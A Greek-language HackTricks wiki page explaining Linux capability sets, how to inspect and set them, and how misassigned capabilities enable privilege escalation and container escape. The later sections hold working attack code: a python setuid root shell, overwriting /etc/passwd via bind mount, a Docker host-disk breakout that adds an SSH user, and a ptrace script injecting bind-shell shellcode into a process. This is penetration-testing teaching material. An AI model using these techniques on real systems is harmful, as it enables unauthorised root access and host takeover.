# Linux Capabilities

{{#include ../../banners/hacktricks-training.md}}

Τα Linux capabilities διαχωρίζουν τα **privileges του root σε μικρότερες, διακριτές μονάδες**, επιτρέποντας στις διεργασίες να έχουν ένα υποσύνολο privileges. Αυτό ελαχιστοποιεί τους κινδύνους, καθώς δεν χορηγούνται άσκοπα πλήρη privileges root.<sup>[[3]](#references)[[4]](#references)[[5]](#references)[[14]](#references)</sup>

### Το πρόβλημα:

- Οι κανονικοί χρήστες έχουν περιορισμένα δικαιώματα για λειτουργίες όπως το άνοιγμα raw sockets ή η σύνδεση σε Internet ports κάτω από το 1024. Τα capabilities μπορούν να χορηγήσουν μόνο τα απαιτούμενα δικαιώματα, αντί για πλήρες privilege root.<sup>[[14]](#references)</sup>

### Σύνολα capabilities:

Το Linux εκθέτει αυτά τα σύνολα capabilities ανά thread, και ο kernel εφαρμόζει τους περιορισμούς τους όταν μια διεργασία αλλάζει διαπιστευτήρια ή εκτελεί ένα αρχείο.<sup>[[14]](#references)</sup>

1. **Inherited (CapInh)**:

   - **Σκοπός**: Προσδιορίζει τα capabilities που μπορούν να συνεισφέρουν στο permitted set μετά το `execve()`, όταν το εκτελούμενο αρχείο έχει αντίστοιχα inheritable file capabilities.
   - **Λειτουργία**: Το inheritable set του thread διατηρείται μετά το `execve()`· από μόνο του δεν καθιστά αυτά τα capabilities effective.
   - **Περιορισμοί**: Η προσθήκη ενός capability σε αυτό το σύνολο περιορίζεται από τα permitted και bounding sets.<sup>[[14]](#references)</sup>

2. **Effective (CapEff)**:

   - **Σκοπός**: Αντιπροσωπεύει τα capabilities που χρησιμοποιεί πραγματικά μια διεργασία κάθε στιγμή.
   - **Λειτουργία**: Είναι το σύνολο των capabilities που ελέγχει ο kernel για να χορηγήσει δικαιώματα σε διάφορες λειτουργίες. Για τα αρχεία, αυτό το σύνολο μπορεί να είναι μια σημαία που υποδεικνύει αν τα permitted capabilities του αρχείου θα θεωρηθούν effective.
   - **Σημασία**: Το effective set είναι καθοριστικό για τους άμεσους ελέγχους privileges, καθώς αποτελεί το ενεργό σύνολο capabilities που μπορεί να χρησιμοποιήσει μια διεργασία.

3. **Permitted (CapPrm)**:

   - **Σκοπός**: Καθορίζει το μέγιστο σύνολο capabilities που μπορεί να έχει μια διεργασία.
   - **Λειτουργία**: Μια διεργασία μπορεί να προαγάγει ένα capability από το permitted set στο effective set, αποκτώντας έτσι τη δυνατότητα να το χρησιμοποιήσει. Μπορεί επίσης να αφαιρέσει capabilities από το permitted set.
   - **Όριο**: Αν ένα capability αφαιρεθεί από αυτό το σύνολο, συνήθως δεν μπορεί να αποκατασταθεί χωρίς την εκτέλεση ενός αρχείου που το χορηγεί ή κάποιας άλλης προνομιακής μετάβασης.<sup>[[14]](#references)</sup>

4. **Bounding (CapBnd)**:

   - **Σκοπός**: Περιορίζει τα capabilities που μπορεί να αποκτήσει μια διεργασία από ένα αρχείο κατά το `execve()` και όσα μπορεί να προσθέσει στο inheritable set της.
   - **Λειτουργία**: Το σύνολο κληρονομείται μέσω του `fork()` και διατηρείται μέσω του `execve()`· τα capabilities μπορούν να αφαιρεθούν από αυτό όταν ο caller έχει το `CAP_SETPCAP`.
   - **Περίπτωση χρήσης**: Η αφαίρεση περιττών capabilities από αυτό το σύνολο περιορίζει την απόκτηση privileges αργότερα.<sup>[[14]](#references)</sup>

5. **Ambient (CapAmb)**:
   - **Σκοπός**: Επιτρέπει σε επιλεγμένα capabilities να παραμένουν permitted και effective κατά το `execve()` ενός μη προνομιακού προγράμματος.
   - **Λειτουργία**: Τα ambient capabilities προστίθενται στα νέα permitted και effective sets όταν το εκτελούμενο αρχείο δεν είναι προνομιακό.
   - **Περιορισμοί**: Ένα capability μπορεί να είναι ambient μόνο όταν υπάρχει τόσο στο permitted όσο και στο inheritable set· η εκτέλεση ενός αρχείου set-user-ID/set-group-ID ή ενός αρχείου με capabilities εκκαθαρίζει το ambient set.<sup>[[8]](#references)[[9]](#references)[[14]](#references)</sup>

## Capabilities διεργασιών και binaries

### Capabilities διεργασιών

Για να δείτε τα capabilities μιας συγκεκριμένης διεργασίας, χρησιμοποιήστε το αρχείο **status** στον κατάλογο /proc. Επειδή παρέχει περισσότερες λεπτομέρειες, ας περιοριστούμε μόνο στις πληροφορίες που αφορούν τα Linux capabilities.\
Σημειώστε ότι για όλες τις εκτελούμενες διεργασίες, οι πληροφορίες capabilities διατηρούνται ανά thread, ενώ τα file capabilities αποθηκεύονται σε extended attributes `security.capability`.<sup>[[14]](#references)[[15]](#references)</sup>

Μπορείτε να βρείτε τα capabilities που ορίζονται στο /usr/include/linux/capability.h

Μπορείτε να βρείτε τα capabilities της τρέχουσας διεργασίας με `cat /proc/self/status` ή με `capsh --print`, και εκείνα άλλων διεργασιών στο `/proc/<pid>/status`.<sup>[[15]](#references)[[26]](#references)</sup>

```bash
cat /proc/1234/status | grep Cap
cat /proc/$$/status | grep Cap #This will print the capabilities of the current process
```

Αυτή η εντολή θα πρέπει να επιστρέφει πέντε γραμμές capabilities στα περισσότερα συστήματα.<sup>[[15]](#references)</sup>

- CapInh = Κληρονομημένα capabilities
- CapPrm = Επιτρεπόμενα capabilities
- CapEff = Ενεργά capabilities
- CapBnd = Όριο capabilities
- CapAmb = Σύνολο ambient capabilities

```bash
#These are the typical capabilities of a root owned process (all)
CapInh: 0000000000000000
CapPrm: 0000003fffffffff
CapEff: 0000003fffffffff
CapBnd: 0000003fffffffff
CapAmb: 0000000000000000
```

Αυτοί οι δεκαεξαδικοί αριθμοί δεν βγάζουν νόημα. Με το εργαλείο `capsh`, μπορούμε να τους αποκωδικοποιήσουμε σε ονόματα capabilities.<sup>[[26]](#references)</sup>

```bash
capsh --decode=0000003fffffffff
0x0000003fffffffff=cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,37
```

Ας ελέγξουμε τώρα τα **capabilities** που χρησιμοποιεί το `ping`:

```bash
cat /proc/9491/status | grep Cap
CapInh:    0000000000000000
CapPrm:    0000000000003000
CapEff:    0000000000000000
CapBnd:    0000003fffffffff
CapAmb:    0000000000000000

capsh --decode=0000000000003000
0x0000000000003000=cap_net_admin,cap_net_raw
```

Παρόλο που αυτό λειτουργεί, υπάρχει ένας ακόμη και ευκολότερος τρόπος. Για να δείτε τις capabilities μιας διεργασίας που εκτελείται, χρησιμοποιήστε το εργαλείο **getpcaps** ακολουθούμενο από το αναγνωριστικό της διεργασίας (PID)· δέχεται επίσης λίστα με αναγνωριστικά διεργασιών.<sup>[[22]](#references)</sup>

```bash
getpcaps 1234
```

Ας ελέγξουμε τις capabilities του `tcpdump`, αφού δώσουμε στο binary `cap_net_admin` και `cap_net_raw` για την παρακολούθηση της κίνησης δικτύου (`tcpdump` εκτελείται στη διεργασία 9562).<sup>[[22]](#references)[[25]](#references)</sup>

```bash
#The following command give tcpdump the needed capabilities to sniff traffic
$ setcap cap_net_raw,cap_net_admin=eip /usr/sbin/tcpdump

$ getpcaps 9562
Capabilities for `9562': = cap_net_admin,cap_net_raw+ep

$ cat /proc/9562/status | grep Cap
CapInh:    0000000000000000
CapPrm:    0000000000003000
CapEff:    0000000000003000
CapBnd:    0000003fffffffff
CapAmb:    0000000000000000

$ capsh --decode=0000000000003000
0x0000000000003000=cap_net_admin,cap_net_raw
```

Όπως μπορείτε να δείτε, τα capabilities αντιστοιχούν στα αποτελέσματα των δύο τρόπων επιθεώρησης μιας διεργασίας. Το εργαλείο `getpcaps` χρησιμοποιεί το libcap για να ελέγξει τα capabilities μιας διεργασίας-στόχου και να τα εμφανίσει σε μορφή κειμένου· δέχεται ένα ή περισσότερα PID.<sup>[[22]](#references)</sup>

### Capabilities δυαδικών αρχείων

Τα δυαδικά αρχεία μπορούν να έχουν file capabilities που εφαρμόζονται κατά την εκτέλεση. Για παράδειγμα, ένα δυαδικό αρχείο `ping` μπορεί να φέρει το capability `cap_net_raw`.<sup>[[14]](#references)</sup>

```bash
getcap /usr/bin/ping
/usr/bin/ping = cap_net_raw+ep
```

Μπορείτε να **αναζητήσετε δυαδικά αρχεία με capabilities** χρησιμοποιώντας `getcap -r`.<sup>[[23]](#references)</sup>

```bash
getcap -r / 2>/dev/null
```

### Αφαίρεση capabilities με το capsh

Αν αφαιρέσουμε το `CAP_NET_RAW` από το τρέχον bounding set, ένα πρόγραμμα που χρειάζεται αυτήν την capability δεν θα μπορεί πλέον να τη χρησιμοποιήσει.<sup>[[26]](#references)</sup>

```bash
capsh --drop=cap_net_raw --print -- -c "tcpdump"
```

Εκτός από την έξοδο του _capsh_, η ίδια η εντολή _tcpdump_ θα πρέπει επίσης να εμφανίσει σφάλμα.

> /bin/bash: /usr/sbin/tcpdump: Operation not permitted

Το σφάλμα δείχνει ότι το `tcpdump` δεν μπορεί να εκτελεστεί με την ζητούμενη δυνατότητα αρχείου, αφού αφαιρέθηκε το `CAP_NET_RAW` από το bounding set.

### Αφαίρεση δυνατοτήτων

Μπορείτε να αφαιρέσετε τις δυνατότητες ενός αρχείου με το `setcap -r`.<sup>[[25]](#references)</sup>

```bash
setcap -r </path/to/binary>
```

## Δυνατότητες χρηστών

Το Linux δεν εκχωρεί απευθείας capabilities αρχείων σε έναν χρήστη σύνδεσης, αλλά το PAM module `pam_cap` μπορεί να ορίσει κληρονομήσιμα capabilities για πιστοποιημένες συνεδρίες χρησιμοποιώντας το `/etc/security/capability.conf`.<sup>[[16]](#references)</sup> Κάθε καταχώριση αντιστοιχίζει ονόματα ή αριθμούς capabilities, διαχωρισμένα με κόμμα, σε ένα ή περισσότερα ονόματα χρηστών.<sup>[[17]](#references)</sup>
Παράδειγμα αρχείου:

```bash
# Simple
cap_sys_ptrace               developer
cap_net_raw                  user1

# Multiple capablities
cap_net_admin,cap_net_raw    jrnetadmin
# Identical, but with numeric values
12,13                        jrnetadmin

# Combining names and numerics
cap_sys_admin,22,25          jrsysadmin
```

## Capabilities περιβάλλοντος

Η μεταγλώττιση του παρακάτω προγράμματος καθιστά δυνατή την **εκκίνηση ενός bash shell μέσα σε ένα περιβάλλον που παρέχει capabilities**.<sup>[[14]](#references)</sup>

```c:ambient.c
/*
 * Test program for the ambient capabilities
 *
 * compile using:
 * gcc -Wl,--no-as-needed -lcap-ng -o ambient ambient.c
 * Set effective, inherited and permitted capabilities to the compiled binary
 * sudo setcap cap_setpcap,cap_net_raw,cap_net_admin,cap_sys_nice+eip ambient
 *
 * To get a shell with additional caps that can be inherited do:
 *
 * ./ambient /bin/bash
 */

#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <errno.h>
#include <sys/prctl.h>
#include <linux/capability.h>
#include <cap-ng.h>

static void set_ambient_cap(int cap) {
  int rc;
  capng_get_caps_process();
  rc = capng_update(CAPNG_ADD, CAPNG_INHERITABLE, cap);
  if (rc) {
    printf("Cannot add inheritable cap\n");
    exit(2);
  }
  capng_apply(CAPNG_SELECT_CAPS);
  /* Note the two 0s at the end. Kernel checks for these */
  if (prctl(PR_CAP_AMBIENT, PR_CAP_AMBIENT_RAISE, cap, 0, 0)) {
    perror("Cannot set cap");
    exit(1);
  }
}
void usage(const char * me) {
  printf("Usage: %s [-c caps] new-program new-args\n", me);
  exit(1);
}
int default_caplist[] = {
  CAP_NET_RAW,
  CAP_NET_ADMIN,
  CAP_SYS_NICE,
  -1
};
int * get_caplist(const char * arg) {
  int i = 1;
  int * list = NULL;
  char * dup = strdup(arg), * tok;
  for (tok = strtok(dup, ","); tok; tok = strtok(NULL, ",")) {
    list = realloc(list, (i + 1) * sizeof(int));
    if (!list) {
      perror("out of memory");
      exit(1);
    }
    list[i - 1] = atoi(tok);
    list[i] = -1;
    i++;
  }
  return list;
}
int main(int argc, char ** argv) {
  int rc, i, gotcaps = 0;
  int * caplist = NULL;
  int index = 1; // argv index for cmd to start
  if (argc < 2)
    usage(argv[0]);
  if (strcmp(argv[1], "-c") == 0) {
    if (argc <= 3) {
      usage(argv[0]);
    }
    caplist = get_caplist(argv[2]);
    index = 3;
  }
  if (!caplist) {
    caplist = (int * ) default_caplist;
  }
  for (i = 0; caplist[i] != -1; i++) {
    printf("adding %d to ambient list\n", caplist[i]);
    set_ambient_cap(caplist[i]);
  }
  printf("Ambient forking shell\n");
  if (execv(argv[index], argv + index))
    perror("Cannot exec");
  return 0;
}
```

```bash
gcc -Wl,--no-as-needed -lcap-ng -o ambient ambient.c
sudo setcap cap_setpcap,cap_net_raw,cap_net_admin,cap_sys_nice+eip ambient
./ambient /bin/bash
```

Μέσα στο **bash που εκτελείται από το μεταγλωττισμένο ambient binary**, είναι δυνατό να παρατηρήσουμε τις **νέες capabilities** (ένας κανονικός χρήστης δεν θα έχει καμία capability στην ενότητα "current").<sup>[[14]](#references)</sup>

```bash
capsh --print
Current: = cap_net_admin,cap_net_raw,cap_sys_nice+eip
```

> [!CAUTION]
> Μπορείτε να **προσθέσετε μόνο capabilities που υπάρχουν** τόσο στο σύνολο permitted όσο και στο σύνολο inheritable.<sup>[[14]](#references)</sup>

### Δυαδικά αρχεία Capability-aware/Capability-dumb

Ένα δυαδικό αρχείο Capability-dumb είναι ένα πρόγραμμα με file capabilities που δεν χρησιμοποιεί το libcap για τη διαχείρισή τους. Αν είναι ενεργοποιημένο το effective bit του αρχείου, ο kernel ενεργοποιεί τις permitted capabilities του αρχείου στο effective set της διεργασίας· η εκτέλεση μπορεί να αποτύχει αν η διεργασία δεν απέκτησε όλες τις permitted capabilities.<sup>[[14]](#references)</sup>

## Capabilities υπηρεσιών

Μια υπηρεσία συστήματος που εκτελείται ως root μπορεί να διατηρεί ευρείες capabilities, εκτός αν το περιβάλλον εκτέλεσής της τις περιορίζει. Σε μια μονάδα systemd, το `User=` επιλέγει τον χρήστη της υπηρεσίας και το `AmbientCapabilities=` προσθέτει τις καθορισμένες capabilities στο ambient set της διεργασίας που εκτελείται.<sup>[[18]](#references)</sup>

```bash
[Service]
User=bob
AmbientCapabilities=CAP_NET_BIND_SERVICE
```

## Δυνατότητες σε Docker Containers

Το Docker εκκινεί containers με ένα προεπιλεγμένο σύνολο δυνατοτήτων, το οποίο μπορεί να τροποποιηθεί με τις επιλογές `--cap-add` και `--cap-drop`. Ένα container μπορεί να επιθεωρηθεί με το `amicontained`.<sup>[[19]](#references)[[24]](#references)</sup>

```bash
docker run --rm -it  r.j3ss.co/amicontained bash
Capabilities:
	BOUNDING -> chown dac_override fowner fsetid kill setgid setuid setpcap net_bind_service net_raw sys_chroot mknod audit_write setfcap

# Add a capabilities
docker run --rm -it --cap-add=SYS_ADMIN r.j3ss.co/amicontained bash

# Add all capabilities
docker run --rm -it --cap-add=ALL r.j3ss.co/amicontained bash

# Remove all and add only one
docker run --rm -it  --cap-drop=ALL --cap-add=SYS_PTRACE r.j3ss.co/amicontained bash
```

## Privesc/Container Escape

Τα capabilities είναι χρήσιμα όταν **θέλετε να περιορίσετε τις δικές σας διεργασίες μετά την εκτέλεση προνομιούχων λειτουργιών** (π.χ. μετά τη ρύθμιση του chroot και τη σύνδεση σε ένα socket). Ωστόσο, μπορούν να αξιοποιηθούν κακόβουλα με την παροχή εντολών ή ορισμάτων που στη συνέχεια εκτελούνται ως root.<sup>[[2]](#references)</sup>

Μπορείτε να ορίσετε capabilities αρχείων για προγράμματα με το `setcap` και να τις ελέγξετε με το `getcap`.<sup>[[23]](#references)[[25]](#references)</sup>

```bash
#Set Capability
setcap cap_net_raw+ep /sbin/ping

#Get Capability
getcap /sbin/ping
/sbin/ping = cap_net_raw+ep
```

Για κείμενο file-capability, το `+ep` προσθέτει την καθορισμένη capability στα σύνολα effective και permitted· το `-` αφαιρεί τις επιλεγμένες σημαίες.<sup>[[21]](#references)</sup>

Για να εντοπίσετε προγράμματα σε ένα σύστημα ή φάκελο που έχουν capabilities, χρησιμοποιήστε το `getcap -r`.<sup>[[23]](#references)</sup>

```bash
getcap -r / 2>/dev/null
```

### Παράδειγμα exploitation

Στο ακόλουθο παράδειγμα, το binary `/usr/bin/python2.6` εντοπίζεται ευάλωτο σε privesc:

```bash
setcap cap_setuid+ep /usr/bin/python2.7
/usr/bin/python2.7 = cap_setuid+ep

#Exploit
/usr/bin/python2.7 -c 'import os; os.setuid(0); os.system("/bin/bash");'
```

**Capabilities** που χρειάζεται το `tcpdump` **για να επιτρέπεται σε οποιονδήποτε χρήστη να κάνει sniff σε πακέτα**:

```bash
setcap cap_net_raw,cap_net_admin=eip /usr/sbin/tcpdump
getcap /usr/sbin/tcpdump
/usr/sbin/tcpdump = cap_net_admin,cap_net_raw+eip
```

### Η ειδική περίπτωση παράλειψης ονόματος capability

Στη μορφή κειμένου του libcap, όταν η εντολή `getcap myelf` εμφανίζει `myelf =ep`, σημαίνει ότι **όλα τα capabilities** έχουν οριστεί ως effective και permitted, με την επιφύλαξη του bounding set, του user namespace και άλλων περιορισμών εκτέλεσης της διεργασίας. Το κενό file capability set είναι `myelf =` (χωρίς `e` ή `p`) και διαφέρει από ένα αρχείο χωρίς attribute capability. Ένα αρχείο `=ep` δεν αλλάζει από μόνο του το UID της διεργασίας σε root, αλλά ένα πρόγραμμα που μπορεί να χρησιμοποιήσει `CAP_DAC_READ_SEARCH` ή `CAP_DAC_OVERRIDE` ενδέχεται να διαβάσει αρχεία που διαφορετικά δεν θα μπορούσε να διαβάσει με το Unix UID του. Πριν θεωρήσετε ότι οι επιλογές εισόδου ενός προγράμματος παρέχουν προνομιακή πρόσβαση ανάγνωσης αρχείων, επιβεβαιώστε την κατάσταση λειτουργίας του πραγματικού εκτελέσιμου αρχείου, το namespace και τα effective capabilities. Δείτε τη [μορφή κειμένου των capabilities](https://man7.org/linux/man-pages/man7/cap_text_formats.7.html) και τη [συμπεριφορά κενής τιμής](https://man7.org/linux/man-pages/man8/getcap.8.html) του libcap.<sup>[[14]](#references)</sup>

## CAP_SYS_ADMIN

Το **[`CAP_SYS_ADMIN`](https://man7.org/linux/man-pages/man7/capabilities.7.html)** είναι ένα εξαιρετικά ισχυρό Linux capability, που συχνά θεωρείται σχεδόν ισοδύναμο με το root λόγω των εκτεταμένων **διαχειριστικών προνομίων** του, όπως η προσάρτηση συσκευών ή ο χειρισμός χαρακτηριστικών του kernel. Παρότι είναι απαραίτητο για containers που προσομοιώνουν ολόκληρα συστήματα, το **`CAP_SYS_ADMIN` δημιουργεί σημαντικές προκλήσεις ασφάλειας**, ιδιαίτερα σε περιβάλλοντα με containers, λόγω της πιθανότητας κλιμάκωσης προνομίων και παραβίασης συστήματος. Συνεπώς, η χρήση του απαιτεί αυστηρές αξιολογήσεις ασφάλειας και προσεκτική διαχείριση. Για την τήρηση της **αρχής των ελάχιστων προνομίων** και τον περιορισμό της επιφάνειας επίθεσης, συνιστάται να αφαιρείται αυτό το capability από containers που προορίζονται για συγκεκριμένες εφαρμογές.<sup>[[14]](#references)</sup>

Για τις μεταβάσεις namespace, έχει σημασία το πεδίο ισχύος: η `setns()` ελέγχει το `CAP_SYS_ADMIN` σε σχέση με το user namespace στο οποίο ανήκει ο προορισμός. Η είσοδος σε mount namespace απαιτεί επίσης `CAP_SYS_CHROOT` στο user namespace της καλούσας διεργασίας. Επομένως, ένα capability που υπάρχει μόνο μέσα σε ένα ιδιωτικό, αναχαρτογραφημένο user namespace δεν παρέχει αυθαίρετη πρόσβαση στα αρχικά namespaces του host.<sup>[[14]](#references)</sup>

**Παράδειγμα με binary**

```bash
getcap -r / 2>/dev/null
/usr/bin/python2.7 = cap_sys_admin+ep
```

Χρησιμοποιώντας την Python, μπορείτε να προσαρτήσετε ένα τροποποιημένο αρχείο _passwd_ πάνω από το πραγματικό αρχείο _passwd_:

```bash
cp /etc/passwd ./ #Create a copy of the passwd file
openssl passwd -1 -salt abc password #Get hash of "password"
vim ./passwd #Change roots passwords of the fake passwd file
```

Και τέλος κάντε **mount** το τροποποιημένο αρχείο `passwd` στο `/etc/passwd`:

```python
from ctypes import *
libc = CDLL("libc.so.6")
libc.mount.argtypes = (c_char_p, c_char_p, c_char_p, c_ulong, c_char_p)
MS_BIND = 4096
source = b"/path/to/fake/passwd"
target = b"/etc/passwd"
filesystemtype = b"none"
options = b"rw"
mountflags = MS_BIND
libc.mount(source, target, filesystemtype, mountflags, options)
```

Και θα μπορείτε να κάνετε **`su` ως root** χρησιμοποιώντας τον κωδικό πρόσβασης "password".

**Παράδειγμα με environment (Docker breakout)**

Μπορείτε να ελέγξετε τις ενεργοποιημένες capabilities μέσα στο docker container χρησιμοποιώντας:

```
capsh --print
Current: = cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read+ep
Bounding set =cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read
Securebits: 00/0x0/1'b0
 secure-noroot: no (unlocked)
 secure-no-suid-fixup: no (unlocked)
 secure-keep-caps: no (unlocked)
uid=0(root)
gid=0(root)
groups=0(root)
```

Στην προηγούμενη έξοδο μπορείτε να δείτε ότι η capability SYS_ADMIN είναι ενεργοποιημένη.<sup>[[14]](#references)</sup>

- **Mount**

Με κατάλληλη πρόσβαση σε συσκευές και namespaces, αυτό μπορεί να επιτρέψει σε ένα Docker container να **προσαρτήσει έναν δίσκο του host και να αποκτήσει πρόσβαση στα περιεχόμενά του**. Ο κόμβος συσκευής πρέπει να αντιστοιχεί σε πραγματική συσκευή του host, το device cgroup πρέπει να το επιτρέπει, και για την προσάρτηση ενός filesystem βασισμένου σε block απαιτείται `CAP_SYS_ADMIN` στο αρχικό user namespace.<sup>[[14]](#references)</sup>

```bash
lsblk -o NAME,PATH,TYPE,SIZE,FSTYPE,MOUNTPOINTS
node_root_device=/dev/sda1 # Replace with the validated filesystem partition or LV.
mkdir -p /mnt/host
mount -o ro "${node_root_device}" /mnt/host
cat /mnt/host/etc/hostname
umount /mnt/host
```

- **Πλήρης πρόσβαση**

Στην προηγούμενη μέθοδο καταφέραμε να αποκτήσουμε πρόσβαση σε έναν δίσκο host.\
Αν ο host εκτελεί έναν server **ssh**, θα μπορούσατε να **δημιουργήσετε έναν χρήστη μέσα στον προσαρτημένο δίσκο** και να αποκτήσετε πρόσβαση μέσω SSH.<sup>[[14]](#references)</sup>

```bash
#Like in the example before, the first step is to mount the docker host disk
node_root_device=/dev/sda1
mount "${node_root_device}" /mnt/host

#Then, search for open ports inside the docker host
nc -v -n -w2 -z 172.17.0.1 1-65535
(UNKNOWN) [172.17.0.1] 2222 (?) open

#Finally, create a new user inside the docker host and use it to access via SSH
chroot /mnt/host adduser john
ssh john@172.17.0.1 -p 2222
```

Οι απευθείας αναγνώσεις και εγγραφές στο `/mnt/host` παρέχουν ήδη πρόσβαση στο filesystem του host. Το τελικό `chroot` είναι απλώς μια διευκόλυνση για τη χρήση διαδρομών και απαιτεί επιπλέον `CAP_SYS_CHROOT`· δεν είναι αυτό το βήμα που δημιουργεί το escape.

## CAP_SYS_PTRACE

Με `CAP_SYS_PTRACE`, μια διεργασία μπορεί να παρακολουθεί και να επιθεωρεί άλλες διεργασίες που είναι ορατές στο PID namespace της. Για να στοχεύσετε διεργασίες του host από ένα Docker container, χρησιμοποιήστε κοινό PID namespace με το host μέσω του `--pid=host` (ή εισέλθετε σε ένα namespace που περιέχει τη διεργασία-στόχο).<sup>[[14]](#references)[[20]](#references)</sup>

Το **[`CAP_SYS_PTRACE`](https://man7.org/linux/man-pages/man7/capabilities.7.html)** παρέχει τη δυνατότητα χρήσης των λειτουργιών debugging και tracing system calls που προσφέρουν τα `ptrace(2)` και οι κλήσεις cross-memory attach, όπως οι `process_vm_readv(2)` και `process_vm_writev(2)`. Παρότι είναι ισχυρό για σκοπούς διάγνωσης και παρακολούθησης, αν το `CAP_SYS_PTRACE` είναι ενεργοποιημένο χωρίς περιοριστικά μέτρα, όπως ένα seccomp filter στο `ptrace(2)`, μπορεί να υπονομεύσει σημαντικά την ασφάλεια του συστήματος. Συγκεκριμένα, μπορεί να αξιοποιηθεί για την παράκαμψη άλλων περιορισμών ασφαλείας, ιδίως όσων επιβάλλονται από το seccomp, όπως δείχνουν [proofs of concept (PoC) όπως αυτό](https://gist.github.com/thejh/8346f47e359adecd1d53).<sup>[[10]](#references)</sup>

**Παράδειγμα με binary (python)**

```bash
getcap -r / 2>/dev/null
/usr/bin/python2.7 = cap_sys_ptrace+ep
```

```python
import ctypes
import sys
import struct
# Macros defined in <sys/ptrace.h>
# https://code.woboq.org/qt5/include/sys/ptrace.h.html
PTRACE_POKETEXT = 4
PTRACE_GETREGS = 12
PTRACE_SETREGS = 13
PTRACE_ATTACH = 16
PTRACE_DETACH = 17
# Structure defined in <sys/user.h>
# https://code.woboq.org/qt5/include/sys/user.h.html#user_regs_struct
class user_regs_struct(ctypes.Structure):
    _fields_ = [
        ("r15", ctypes.c_ulonglong),
        ("r14", ctypes.c_ulonglong),
        ("r13", ctypes.c_ulonglong),
        ("r12", ctypes.c_ulonglong),
        ("rbp", ctypes.c_ulonglong),
        ("rbx", ctypes.c_ulonglong),
        ("r11", ctypes.c_ulonglong),
        ("r10", ctypes.c_ulonglong),
        ("r9", ctypes.c_ulonglong),
        ("r8", ctypes.c_ulonglong),
        ("rax", ctypes.c_ulonglong),
        ("rcx", ctypes.c_ulonglong),
        ("rdx", ctypes.c_ulonglong),
        ("rsi", ctypes.c_ulonglong),
        ("rdi", ctypes.c_ulonglong),
        ("orig_rax", ctypes.c_ulonglong),
        ("rip", ctypes.c_ulonglong),
        ("cs", ctypes.c_ulonglong),
        ("eflags", ctypes.c_ulonglong),
        ("rsp", ctypes.c_ulonglong),
        ("ss", ctypes.c_ulonglong),
        ("fs_base", ctypes.c_ulonglong),
        ("gs_base", ctypes.c_ulonglong),
        ("ds", ctypes.c_ulonglong),
        ("es", ctypes.c_ulonglong),
        ("fs", ctypes.c_ulonglong),
        ("gs", ctypes.c_ulonglong),
    ]

libc = ctypes.CDLL("libc.so.6")

pid=int(sys.argv[1])

# Define argument type and respone type.
libc.ptrace.argtypes = [ctypes.c_uint64, ctypes.c_uint64, ctypes.c_void_p, ctypes.c_void_p]
libc.ptrace.restype = ctypes.c_uint64

# Attach to the process
libc.ptrace(PTRACE_ATTACH, pid, None, None)
registers=user_regs_struct()

# Retrieve the value stored in registers
libc.ptrace(PTRACE_GETREGS, pid, None, ctypes.byref(registers))
print("Instruction Pointer: " + hex(registers.rip))
print("Injecting Shellcode at: " + hex(registers.rip))

# Shell code copied from exploit db. https://github.com/0x00pf/0x00sec_code/blob/master/mem_inject/infect.c
shellcode = "\x48\x31\xc0\x48\x31\xd2\x48\x31\xf6\xff\xc6\x6a\x29\x58\x6a\x02\x5f\x0f\x05\x48\x97\x6a\x02\x66\xc7\x44\x24\x02\x15\xe0\x54\x5e\x52\x6a\x31\x58\x6a\x10\x5a\x0f\x05\x5e\x6a\x32\x58\x0f\x05\x6a\x2b\x58\x0f\x05\x48\x97\x6a\x03\x5e\xff\xce\xb0\x21\x0f\x05\x75\xf8\xf7\xe6\x52\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x8d\x3c\x24\xb0\x3b\x0f\x05"

# Inject the shellcode into the running process byte by byte.
for i in xrange(0,len(shellcode),4):
    # Convert the byte to little endian.
    shellcode_byte_int=int(shellcode[i:4+i].encode('hex'),16)
    shellcode_byte_little_endian=struct.pack("<I", shellcode_byte_int).rstrip('\x00').encode('hex')
    shellcode_byte=int(shellcode_byte_little_endian,16)

    # Inject the byte.
    libc.ptrace(PTRACE_POKETEXT, pid, ctypes.c_void_p(registers.rip+i),shellcode_byte)

print("Shellcode Injected!!")

# Modify the instuction pointer
registers.rip=registers.rip+2

# Set the registers
libc.ptrace(PTRACE_SETREGS, pid, None, ctypes.byref(registers))
print("Final Instruction Pointer: " + hex(registers.rip))

# Detach from the process.
libc.ptrace(PTRACE_DETACH, pid, None, None)
```

**Παράδειγμα με binary (gdb)**

`gdb` με δυνατότητα `ptrace`:

```
/usr/bin/gdb = cap_sys_ptrace+ep
```

